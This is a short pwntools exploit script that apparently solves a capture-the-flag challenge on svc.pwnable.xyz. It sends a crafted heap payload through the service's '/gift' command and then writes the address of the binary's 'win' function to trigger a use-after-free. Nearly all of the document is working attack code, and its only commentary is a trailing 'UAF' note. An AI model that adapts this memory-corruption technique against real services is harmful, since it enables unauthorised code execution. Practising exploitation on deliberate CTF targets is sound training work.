from pwn import *

# context.log_level = 'debug'
e = ELF('./challenge')
# p = process([e.path], env={'LD_PRELOAD':'../libc/alpine-libc-2.24.so'})
# p = process(e.path)
p = remote('svc.pwnable.xyz', 30034)

pay = b'\xff' * 223 + b'\x8c' + b'\xdb' * 223 + b'\x2a'

p.sendlineafter(b'@you> ', b'/gift')
p.sendlineafter(b':', str(len(pay)))

p.sendafter(b':', pay)

p.sendlineafter(b'@you> ', b'/gift')
p.sendlineafter(b':', b'32')

pause()
p.sendafter(b':', b'A'*8 + p64(e.symbols['win']))

p.interactive()

# UAF